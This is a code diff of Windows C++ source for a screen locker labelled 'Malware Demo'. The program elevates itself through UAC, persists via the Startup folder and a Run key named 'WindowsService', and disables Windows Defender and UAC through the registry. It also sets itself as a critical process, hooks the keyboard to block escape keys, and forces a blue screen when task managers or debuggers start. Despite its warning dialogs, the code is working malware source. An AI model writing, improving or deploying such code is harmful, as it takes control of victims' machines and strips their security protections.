@@ -1,11 +1,16 @@
+#ifndef UNICODE
+#define UNICODE
+#endif
 #define WIN32_LEAN_AND_MEAN
 #include <windows.h>
 #include <tlhelp32.h>
+#include <shlobj.h>
 #include <string>
 #include <vector>
 
 #pragma comment(lib, "user32.lib")
 #pragma comment(lib, "advapi32.lib")
+#pragma comment(lib, "shell32.lib")
 
 HWND g_hLocker = 0;
 HHOOK g_hHook = 0;
@@ -22,12 +27,18 @@ void DisableDefenderAndUAC();
 void MakeProcessCritical(BOOL critical);
 void DoBSOD();
 DWORD WINAPI MonitorThread(LPVOID);
+void RequestAdmin();
 
-int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, PWSTR, int nShow) {
+int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, PWSTR, int nShow)
+{
+    RequestAdmin();  // Ensure we have admin rights
     Warnings();
     const wchar_t CLS[] = L"MainWnd";
-    WNDCLASS wc = {}; wc.lpfnWndProc = MainProc; wc.hInstance = hInst;
-    wc.lpszClassName = CLS; wc.hCursor = LoadCursor(0, IDC_ARROW);
+    WNDCLASS wc = {};
+    wc.lpfnWndProc = MainProc;
+    wc.hInstance = hInst;
+    wc.lpszClassName = CLS;
+    wc.hCursor = LoadCursor(0, IDC_ARROW);
     RegisterClass(&wc);
     HWND hWnd = CreateWindowEx(0, CLS, L"Confirmation",
         WS_OVERLAPPEDWINDOW & ~WS_THICKFRAME & ~WS_MAXIMIZEBOX,
@@ -36,20 +47,53 @@ int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, PWSTR, int nShow) {
         50, 40, 300, 30, hWnd, (HMENU)100, hInst, 0);
     CreateWindow(L"BUTTON", L"Start", WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
         150, 90, 100, 30, hWnd, (HMENU)101, hInst, 0);
-    ShowWindow(hWnd, nShow); UpdateWindow(hWnd);
-    MSG m; while (GetMessage(&m, 0, 0, 0)) { TranslateMessage(&m); DispatchMessage(&m); }
+    ShowWindow(hWnd, nShow);
+    UpdateWindow(hWnd);
+    MSG m;
+    while (GetMessage(&m, 0, 0, 0)) { TranslateMessage(&m); DispatchMessage(&m); }
     return 0;
 }
 
-void Warnings() {
-    MessageBox(0, L"WARN: This program is a malicious programm "
-        L"Proceed only if you know what you doing.",
-        L"ShittyVirus", MB_OK | MB_ICONWARNING | MB_SYSTEMMODAL);
-    MessageBox(0, L"WARN 2: you take your responsibility on myself. "
-        L"ShittyVirus", MB_OK | MB_ICONSTOP | MB_SYSTEMMODAL);
+// Request administrator privileges if missing
+void RequestAdmin()
+{
+    BOOL isAdmin = FALSE;
+    PSID adminGroup;
+    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
+    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
+        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup))
+    {
+        CheckTokenMembership(0, adminGroup, &isAdmin);
+        FreeSid(adminGroup);
+    }
+    if (!isAdmin)
+    {
+        wchar_t path[MAX_PATH];
+        GetModuleFileName(0, path, MAX_PATH);
+        SHELLEXECUTEINFO sei = { sizeof(sei) };
+        sei.lpVerb = L"runas";
+        sei.lpFile = path;
+        sei.nShow = SW_NORMAL;
+        if (ShellExecuteEx(&sei))
+            ExitProcess(0);
+        // If user rejected UAC prompt, just continue without admin
+    }
 }
 
-LRESULT CALLBACK MainProc(HWND h, UINT m, WPARAM w, LPARAM l) {
+void Warnings()
+{
+    MessageBox(0, L"WARNING 1/2: This program is a malicious demo. "
+        L"It will lock your screen, disable security features, and cause a BSOD if tampered with. "
+        L"Proceed only in an isolated lab environment.",
+        L"Malware Demo", MB_OK | MB_ICONWARNING | MB_SYSTEMMODAL);
+    MessageBox(0, L"WARNING 2/2: Full responsibility is yours. "
+        L"The locker covers all monitors and blocks most escape shortcuts. "
+        L"Closing it will crash the system.",
+        L"Malware Demo", MB_OK | MB_ICONSTOP | MB_SYSTEMMODAL);
+}
+
+LRESULT CALLBACK MainProc(HWND h, UINT m, WPARAM w, LPARAM l)
+{
     if (m == WM_COMMAND && LOWORD(w) == 101) {
         if (SendMessage(GetDlgItem(h, 100), BM_GETCHECK, 0, 0) == BST_CHECKED) {
             if (IDYES == MessageBox(h, L"Final check: execute locker and arm protections?",
@@ -63,7 +107,8 @@ LRESULT CALLBACK MainProc(HWND h, UINT m, WPARAM w, LPARAM l) {
     return DefWindowProc(h, m, w, l);
 }
 
-LRESULT CALLBACK KbHook(int code, WPARAM w, LPARAM l) {
+LRESULT CALLBACK KbHook(int code, WPARAM w, LPARAM l)
+{
     if (code == HC_ACTION && (w == WM_KEYDOWN || w == WM_SYSKEYDOWN)) {
         KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)l;
         bool alt = GetAsyncKeyState(VK_MENU) & 0x8000;
@@ -98,7 +143,8 @@ LRESULT CALLBACK KbHook(int code, WPARAM w, LPARAM l) {
     return CallNextHookEx(g_hHook, code, w, l);
 }
 
-LRESULT CALLBACK LockerProc(HWND h, UINT m, WPARAM w, LPARAM l) {
+LRESULT CALLBACK LockerProc(HWND h, UINT m, WPARAM w, LPARAM l)
+{
     if (m == WM_PAINT) {
         PAINTSTRUCT ps; HDC dc = BeginPaint(h, &ps); RECT r; GetClientRect(h, &r);
         HBRUSH b = CreateSolidBrush(RGB(0, 0, 0)); FillRect(dc, &r, b); DeleteObject(b);
@@ -116,7 +162,8 @@ LRESULT CALLBACK LockerProc(HWND h, UINT m, WPARAM w, LPARAM l) {
 }
 
 // Persistence: copies self to Startup folder and registry Run key
-void SetupPersistence() {
+void SetupPersistence()
+{
     wchar_t path[MAX_PATH];
     GetModuleFileName(0, path, MAX_PATH);
     wchar_t startup[MAX_PATH];
@@ -126,13 +173,14 @@ void SetupPersistence() {
     }
     HKEY hKey;
     if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
-        RegSetValueEx(hKey, L"WindowsService", 0, REG_SZ, (BYTE*)path, (wcslen(path) + 1) * sizeof(wchar_t));
+        RegSetValueEx(hKey, L"WindowsService", 0, REG_SZ, (BYTE*)path, (DWORD)((wcslen(path) + 1) * sizeof(wchar_t)));
         RegCloseKey(hKey);
     }
 }
 
 // Disables Windows Defender and UAC via registry (requires admin)
-void DisableDefenderAndUAC() {
+void DisableDefenderAndUAC()
+{
     HKEY hKey;
     if (RegCreateKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, 0, 0, KEY_SET_VALUE, 0, &hKey, 0) == ERROR_SUCCESS) {
         DWORD val = 1;
@@ -152,11 +200,12 @@ void DisableDefenderAndUAC() {
     }
 }
 
-typedef NTSTATUS (NTAPI* pRtlSetProcessIsCritical)(BOOLEAN, PBOOLEAN, BOOLEAN);
-typedef NTSTATUS (NTAPI* pNtRaiseHardError)(NTSTATUS, ULONG, ULONG, PVOID, ULONG, PULONG);
+typedef NTSTATUS (NTAPI *pRtlSetProcessIsCritical)(BOOLEAN, PBOOLEAN, BOOLEAN);
+typedef NTSTATUS (NTAPI *pNtRaiseHardError)(NTSTATUS, ULONG, ULONG, PVOID, ULONG, PULONG);
 
 // Makes the current process critical — terminating it will cause a BSOD
-void MakeProcessCritical(BOOL critical) {
+void MakeProcessCritical(BOOL critical)
+{
     HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
     if (ntdll) {
         pRtlSetProcessIsCritical RtlSetProcessIsCritical =
@@ -169,7 +218,8 @@ void MakeProcessCritical(BOOL critical) {
 }
 
 // Triggers a Blue Screen of Death
-void DoBSOD() {
+void DoBSOD()
+{
     HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
     if (ntdll) {
         pRtlSetProcessIsCritical RtlSetProcessIsCritical =
@@ -191,8 +241,9 @@ void DoBSOD() {
     TerminateProcess(OpenProcess(PROCESS_TERMINATE, FALSE, 4), 1);
 }
 
-// Monitors for blacklisted processes (task manager, debuggers, etc.) and triggers BSOD if found
-DWORD WINAPI MonitorThread(LPVOID) {
+// Monitors for blacklisted processes and triggers BSOD if found
+DWORD WINAPI MonitorThread(LPVOID)
+{
     const std::vector<std::wstring> blacklist = {
         L"taskmgr.exe",
         L"procexp.exe", L"procmon.exe",
@@ -206,8 +257,8 @@ DWORD WINAPI MonitorThread(LPVOID) {
     while (!g_Unlocked) {
         HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
         if (snap != INVALID_HANDLE_VALUE) {
-            PROCESSENTRY32 pe = { sizeof(pe) };
-            if (Process32First(snap, &pe)) {
+            PROCESSENTRY32W pe = { sizeof(pe) };
+            if (Process32FirstW(snap, &pe)) {
                 do {
                     for (const auto& bad : blacklist) {
                         if (_wcsicmp(pe.szExeFile, bad.c_str()) == 0) {
@@ -216,7 +267,7 @@ DWORD WINAPI MonitorThread(LPVOID) {
                             return 0;
                         }
                     }
-                } while (Process32Next(snap, &pe));
+                } while (Process32NextW(snap, &pe));
             }
             CloseHandle(snap);
         }
@@ -225,8 +276,9 @@ DWORD WINAPI MonitorThread(LPVOID) {
     return 0;
 }
 
-// Main locker routine: sets up persistence, disables defenses, hooks keyboard, and shows fullscreen lock window
-void StartLocker() {
+// Main locker routine
+void StartLocker()
+{
     SetupPersistence();
     DisableDefenderAndUAC();
     MakeProcessCritical(TRUE);
@@ -236,15 +288,19 @@ void StartLocker() {
     int x = GetSystemMetrics(SM_XVIRTUALSCREEN), y = GetSystemMetrics(SM_YVIRTUALSCREEN);
     int w = GetSystemMetrics(SM_CXVIRTUALSCREEN), h = GetSystemMetrics(SM_CYVIRTUALSCREEN);
     const wchar_t CLS[] = L"LockerWnd";
-    WNDCLASS wc = {}; wc.lpfnWndProc = LockerProc; wc.hInstance = GetModuleHandle(0);
-    wc.lpszClassName = CLS; wc.hCursor = LoadCursor(0, IDC_ARROW);
+    WNDCLASS wc = {};
+    wc.lpfnWndProc = LockerProc;
+    wc.hInstance = GetModuleHandle(0);
+    wc.lpszClassName = CLS;
+    wc.hCursor = LoadCursor(0, IDC_ARROW);
     wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
     RegisterClass(&wc);
     g_hLocker = CreateWindowEx(WS_EX_TOPMOST | WS_EX_TOOLWINDOW, CLS, L"",
         WS_POPUP | WS_VISIBLE, x, y, w, h, 0, 0, GetModuleHandle(0), 0);
     SetWindowPos(g_hLocker, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
 
-    MSG m; while (GetMessage(&m, 0, 0, 0)) { TranslateMessage(&m); DispatchMessage(&m); }
+    MSG m;
+    while (GetMessage(&m, 0, 0, 0)) { TranslateMessage(&m); DispatchMessage(&m); }
 
     g_Unlocked = true;
     TerminateThread(g_hMonitorThread, 0);
